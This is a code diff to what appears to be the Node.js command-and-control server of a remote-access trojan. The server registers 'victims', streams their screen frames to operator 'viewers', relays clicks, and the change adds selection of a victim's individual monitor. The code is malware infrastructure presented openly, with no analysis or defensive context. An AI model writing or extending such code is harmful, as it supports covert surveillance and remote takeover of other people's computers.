@@ -8,7 +8,7 @@ const server = http.createServer(app);
 const io = new Server(server, {
   transports: ["websocket", "polling"],
   cors: { origin: "*" },
-  maxHttpBufferSize: 1 * 1024 * 1024,  // down from 10MB
+  maxHttpBufferSize: 1 * 1024 * 1024,
   pingTimeout: 60000,
   pingInterval: 25000
 });
@@ -37,7 +37,7 @@ io.on("connection", (socket) => {
       socket,
       w: data.w || 1920,
       h: data.h || 1080,
-      monitors: data.monitors || [{ w: data.w || 1920, h: data.h || 1080, x: 0, y: 0, primary: true }],
+      monitors: data.monitors || [],
       connectedAt: Date.now()
     });
     socket.victimId = victimId;
@@ -49,7 +49,6 @@ io.on("connection", (socket) => {
     socket.on("frame", (frameData) => {
       const stream = frameStreams.get(victimId);
       if (stream && stream.size > 0) {
-        // Only relay to connected viewers
         const toRemove = [];
         stream.forEach((viewerSocket) => {
           if (viewerSocket.connected) {
@@ -94,7 +93,8 @@ io.on("connection", (socket) => {
     socket.on("select-victim", (data) => {
       const victimId = typeof data === "string" ? data : data.id;
       const crop = data.crop || null;
-      
+      const monitorIndex = data.monitorIndex !== undefined ? data.monitorIndex : null;
+
       const victim = victims.get(victimId);
       if (!victim) {
         socket.emit("error", { msg: "Victim not available" });
@@ -124,21 +124,24 @@ io.on("connection", (socket) => {
       frameStreams.get(victimId).add(socket);
 
       victim.socket.emit("viewer-count", frameStreams.get(victimId).size);
-      if (crop) {
-        victim.socket.emit("set-crop", crop);
-      } else {
-        victim.socket.emit("set-crop", null);
-      }
+
+      // Send crop info with monitorIndex for the victim
+      const cropPayload = monitorIndex !== null && monitorIndex !== undefined
+        ? { monitorIndex }
+        : null;
+
+      victim.socket.emit("set-crop", cropPayload);
 
       socket.emit("victim-info", {
         id: victimId,
         w: crop ? crop.w : victim.w,
         h: crop ? crop.h : victim.h,
         monitors: victim.monitors,
-        crop: crop
+        crop: cropPayload,
+        monitorIndex: monitorIndex
       });
 
-      console.log(`[VIEWING] ${socket.id} -> ${victimId}${crop ? ' (cropped)' : ''}`);
+      console.log(`[VIEWING] ${socket.id} -> ${victimId}${monitorIndex !== null ? ` monitor[${monitorIndex}]` : ''}`);
     });
 
     socket.on("click", (data) => {
